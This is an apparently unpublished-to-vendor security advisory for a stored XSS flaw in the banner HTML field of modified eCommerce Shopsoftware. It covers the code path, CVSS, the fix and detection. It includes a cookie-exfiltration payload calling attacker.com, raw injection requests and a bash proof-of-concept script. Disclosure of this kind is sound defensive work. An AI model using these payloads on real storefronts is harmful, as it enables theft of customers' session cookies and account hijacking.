# Security Advisory: Stored Cross-Site Scripting via Banner HTML Text (Public)

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 5.4 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Stored
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Stored Cross-Site Scripting vulnerability in the public storefront banner display. The `banners_html_text` field in the `banners` table is saved via `xtc_db_prepare_input()` (which only calls `trim()` and `stripslashes()`) and is passed raw to a Smarty template variable `{$banner_data.TEXT}` without the `|escape` modifier. Since Smarty's `escape_html` is `false` by default, any JavaScript injected into a banner's HTML text field executes in the browsers of all unauthenticated visitors who load any page displaying that banner group.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: inc/xtc_display_banner.inc.php | rev 16825 | None | Affected |
| Component: templates/tpl_modified_nova/module/banners.html | rev 16825 | None | Affected |
| Component: admin/banner_manager.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker), Smarty 3

---

## 3. Vulnerability Description

Banners are managed in `admin/banner_manager.php`. The `html_text` field is stored as:

```php
// admin/banner_manager.php:99
$html_text = xtc_db_prepare_input($_POST['html_text'][$languages[$i]['id']]);
// xtc_db_prepare_input = trim() + stripslashes() — no HTML encoding
```

It is inserted into the `banners` table column `banners_html_text`.

When the public storefront renders banners, `inc/xtc_display_banner.inc.php` fetches the record and passes `banners_html_text` to Smarty:

```php
// inc/xtc_display_banner.inc.php:72
'TEXT' => $banner['banners_html_text'],
```

The Smarty template for the nova theme outputs it without the `|escape` modifier:

```smarty
{* templates/tpl_modified_nova/module/banners.html *}
{if $banner_data.TEXT != ''}
  <div class="banner_html_text">
    {$banner_data.TEXT}
  </div>
{/if}
```

Smarty's global `escape_html` is `false` by default (confirmed in `Smarty.class.php:589`), so `{$banner_data.TEXT}` outputs the raw stored value. An admin who sets `banners_html_text` to `<script>alert(document.cookie)</script>` stores the payload. Every unauthenticated visitor whose page includes a banner from that banner group executes the script.

### Necessary Conditions

- **Authentication:** Admin (to set up payload) + None (to trigger)
- **User interaction:** Required — victim must load a page with the banner
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session cookies (non-HttpOnly), page content, authentication state
- **Integrity:** Low — phishing, form input capture, redirects to malicious sites
- **Availability:** None

Banners typically appear on the shop homepage and product pages, maximizing the number of visitors affected. The HTML text field is specifically designed to accept raw HTML, making a payload visually indistinguishable from a legitimate banner.

---

## 5. Classification

### CVSS

- **Score:** 5.4
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | Low |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

### CAPEC

- CAPEC-198: XSS Stored

---

## 6. Exploitation Scenario

1. Admin navigates to Admin → Marketing → Banner Manager → New Banner.
2. In the "HTML Text" textarea, injects: `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
3. Saves the banner and assigns it to a banner group displayed on the homepage.
4. Any visitor who loads the shop homepage has the script silently execute, sending their session cookie to the attacker.
5. Attacker receives customer session tokens and can hijack accounts.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): inc/xtc_display_banner.inc.php:72,114
         templates/tpl_modified_nova/module/banners.html
         admin/banner_manager.php:99,128,179
         Database table: banners (column: banners_html_text)
Parameter(s): html_text[<lang_id>] (POST — admin input)
Method: GET (unauthenticated trigger on any page with banner)
Authentication: Admin to inject; None to trigger
```

### Code Path

```php
// 1. Admin saves banner (banner_manager.php:99):
$html_text = xtc_db_prepare_input($_POST['html_text'][$languages[$i]['id']]);
// xtc_db_prepare_input = trim() + stripslashes() — no htmlspecialchars()

// 2. Stored in DB (banner_manager.php:179):
'banners_html_text' => $html_text,

// 3. Fetched for display (xtc_display_banner.inc.php:72):
'TEXT' => $banner['banners_html_text'],

// 4. Rendered in Smarty template (banners.html):
// {$banner_data.TEXT}  ← no |escape modifier, Smarty escape_html=false
```

### Example Request (inject payload — admin)

```http
POST /admin/banner_manager.php?action=new_banner HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="securityToken"

<CSRF_VALUE>
------Boundary
Content-Disposition: form-data; name="html_text[1]"

<script>alert(document.cookie)</script>
------Boundary
Content-Disposition: form-data; name="banners_group"

DEFAULT
------Boundary
Content-Disposition: form-data; name="status"

1
------Boundary--
```

### Example Request (trigger — unauthenticated)

```http
GET / HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

### Observed Response

```html
HTTP/1.1 200 OK

<div class="banner_html_text">
  <script>alert(document.cookie)</script>
</div>
```

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V16 PoC — Stored XSS via banners_html_text (public storefront)
TARGET="${TARGET:-http://localhost:9080}"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Admin login
SID=$(curl -s -c /tmp/admin_cookies_v16.txt -b /tmp/admin_cookies_v16.txt \
  -H "User-Agent: $UA" \
  -d "username=admin%40shop.local&password=admin123&redirect=" \
  -X POST "$TARGET/admin/login.php?action=process" \
  -D /tmp/v16_headers.txt -o /dev/null
  grep -i "set-cookie.*MODsid" /tmp/v16_headers.txt | grep -oP '(?<=MODsid=)[^;]+' | head -1)

echo "[*] Session: $SID"

# Step 2: Get CSRF token from banner manager
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/banner_manager.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+' | head -1)

echo "[*] CSRF: $CSRF"

# Step 3: Create banner with XSS payload in html_text
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/banner_manager.php?action=new_banner" \
  -F "securityToken=$CSRF" \
  -F 'html_text[1]=<script>alert(document.cookie)</script>' \
  -F "banners_title[1]=TestBanner_V16" \
  -F "banners_group=DEFAULT" \
  -F "status=1" \
  -F "banners_sort=1" \
  -o /dev/null

BANNER_ID=$(docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT MAX(banners_id) FROM banners;" 2>/dev/null | tail -1)
echo "[*] Banner ID: $BANNER_ID"

# Step 4: Trigger as unauthenticated visitor
RESP=$(curl -s "$TARGET/" -H "User-Agent: $UA")
if echo "$RESP" | grep -q "alert(document.cookie)"; then
  echo "[+] VULNERABLE: XSS payload found unencoded in public homepage"
  echo "$RESP" | grep -o '<script>.*</script>' | head -1
else
  echo "[-] Payload not found in homepage — check banner group assignment"
fi

# Cleanup
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "DELETE FROM banners WHERE banners_id='$BANNER_ID';" 2>/dev/null
```

### Expected Result

```text
[+] VULNERABLE: XSS payload found unencoded in public homepage
<script>alert(document.cookie)</script>
```

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Marketing → Banner Manager → New Banner.
3. In the "HTML Text" field, enter `<script>alert(1)</script>`. Set group to `DEFAULT`, status Active. Save.
4. As unauthenticated user, visit `GET /` (the shop homepage).
5. Browser executes `alert(1)` — confirm Stored XSS on public storefront.

---

## 10. Mitigation

- Strip or encode HTML tags from `banners_html_text` before storage, or use an allowlist-based HTML sanitizer (e.g., HTMLPurifier).
- **Alternatively**, enable Smarty global HTML escaping: call `$smarty->setEscapeHtml(true)` in the template init code, then use `{$banner_data.TEXT nofilter}` only for fields that must render HTML after explicit sanitization.
- Implement a Content Security Policy (`Content-Security-Policy: default-src 'self'`) to prevent inline script execution.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// inc/xtc_display_banner.inc.php — Vulnerable:
'TEXT' => $banner['banners_html_text'],

// Option A — HTMLPurifier (safest):
require_once 'HTMLPurifier.auto.php';
$purifier = new HTMLPurifier();
'TEXT' => $purifier->purify($banner['banners_html_text']),

// Option B — Strip all tags (breaks intentional HTML banners):
'TEXT' => htmlspecialchars($banner['banners_html_text'], ENT_QUOTES, 'UTF-8'),
```

```smarty
{* banners.html — Vulnerable: *}
{$banner_data.TEXT}

{* Fixed (after sanitizing server-side with HTMLPurifier): *}
{$banner_data.TEXT nofilter}
```

---

## 12. Detection and Indicators

- `banners` table column `banners_html_text` containing `<script>` or event handler attributes.
- GET to shop homepage returning `<script>` tags inside `.banner_html_text` div.

```sql
SELECT banners_id, banners_html_text
FROM banners
WHERE banners_html_text LIKE '%<%';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed via static analysis (Smarty escape_html=false, no \|escape modifier) |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** Luan Oliveira Ferreira de Almeida
- **Organization:** Independent security researcher
- **Contact:** oliveira.luanalmeida@gmail.com / https://github.com/luan-oliveira01

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- Smarty Security: https://smarty-php.github.io/smarty/api/escaping/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** oliveira.luanalmeida@gmail.com
- **Repository:** https://github.com/luan-oliveira01
